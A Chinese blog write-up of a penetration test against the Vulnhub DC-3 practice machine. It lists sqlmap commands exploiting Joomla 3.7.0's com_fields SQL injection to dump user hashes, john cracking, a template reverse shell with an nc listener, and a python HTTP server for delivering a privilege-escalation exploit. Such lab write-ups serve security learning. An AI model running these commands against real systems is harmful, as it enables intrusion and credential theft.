---
title: DC_3靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false

---

# DC_3靶机渗透测试

[参考链接1]([DC3靶机渗透 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1802814?from=article.detail.1801074))

[参考链接2]([靶机渗透测试实战（三）——DC-3 - 尚码园 (shangmayuan.com)](https://www.shangmayuan.com/a/8933d01639f64ed2a076712a.html))

[参考链接3]([Vulnhub靶机DC系列-DC3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/260547.html))

[**参考链接4**]([Vulnhub - DC3 writeup (mzfr.me)](https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC3))

### 一、信息收集

- 发现DC_3, IP为192.168.0.106，开启80端口，http服务，cms为joomla

![image-20210623010130599](http://cdn.mxrblog.cn/image-20210623010130599.png)

- 登录192.168.0.106

![image-20210623011133176](http://cdn.mxrblog.cn/image-20210623011133176.png)

- 使用joomscan对靶机进行扫描,得到joomscan的版本是3.7.0

```
joomscan -u 192.168.0.106
```

![image-20210625224116900](http://cdn.mxrblog.cn/image-20210625224116900.png)



### 二、寻找漏洞

- 在本地漏洞库中搜索joomla 3.7.0 ， 发现sql注入漏洞



![image-20210625224354232](http://cdn.mxrblog.cn/image-20210625224354232.png)

- 查找漏洞文件，并且查看

![image-20210625224614520](http://cdn.mxrblog.cn/image-20210625224614520.png)

- **查看数据库**, 发现数据库joomladb

```
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![image-20210625225521733](http://cdn.mxrblog.cn/image-20210625225521733.png)

- **查看表**

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb  --tables -p list[fullordering]
```

![image-20210625232524893](http://cdn.mxrblog.cn/image-20210625232524893.png)

- **查看列**

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb  -T "#__users" -columns -p list[fullordering]
```

![image-20210625233936602](http://cdn.mxrblog.cn/image-20210625233936602.png)

- **查看列名为id和password的值**

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb  -T "#__users" -C "username,password" -dump  -p list[fullordering]
```

![image-20210625234159326](http://cdn.mxrblog.cn/image-20210625234159326.png)

- 新建123.txt文件，将经过加密的密码输入进去，通过john进行解密, 密码是snoopy

```
john 123.txt
```

![image-20210625235501516](http://cdn.mxrblog.cn/image-20210625235501516.png)

- 进入后台，发现第二个默认用于所有页面的模板

![image-20210626011114780](http://cdn.mxrblog.cn/image-20210626011114780.png)

- 按照上面分析的选择第二个

![image-20210626011026448](http://cdn.mxrblog.cn/image-20210626011026448.png)



- 插入反弹shell(端口由8080改为4443)

![Screenshot 2021-06-26 011410](http://cdn.mxrblog.cn/Screenshot 2021-06-26 011410.png)

- 执行反弹shell

```
进入 http://192.168.0.106/templates/protostar/index.php
并在攻击机器上执行  nc -nlvp 4443
```

![image-20210626014102164](http://cdn.mxrblog.cn/image-20210626014102164.png)



### 三、进行提权

- 查看内核及其版本

![image-20210626014743668](http://cdn.mxrblog.cn/image-20210626014743668.png)

- 寻找相关linux漏洞，选择第二个

![image-20210626015345596](http://cdn.mxrblog.cn/image-20210626015345596.png)

- 查看内容，并下载相应文件

![image-20210626020732742](http://cdn.mxrblog.cn/image-20210626020732742.png)

![image-20210626020626676](http://cdn.mxrblog.cn/image-20210626020626676.png)

- 用python开启简单的服务器功能

```
python -m SimpleHTTPServer 9000
```

![image-20210626023629392](http://cdn.mxrblog.cn/image-20210626023629392.png)

- 这一步很重要，要不然靶机无权限下载内容

![image-20210626023758606](http://cdn.mxrblog.cn/image-20210626023758606.png)

- 靶机接收文件

![](http://cdn.mxrblog.cn/image-20210626023517587.png)

![image-20210626024815589](http://cdn.mxrblog.cn/image-20210626024815589.png)

![image-20210626024654502](http://cdn.mxrblog.cn/image-20210626024654502.png)

![image-20210626024918136](http://cdn.mxrblog.cn/image-20210626024918136.png)

![image-20210626024958777](http://cdn.mxrblog.cn/image-20210626024958777.png)



### 四、总结

- joomscan
- searchsploit
- SQL injection
- sqlmap
- lsb_release
- john
- php reverse shell
- python’s HTTP server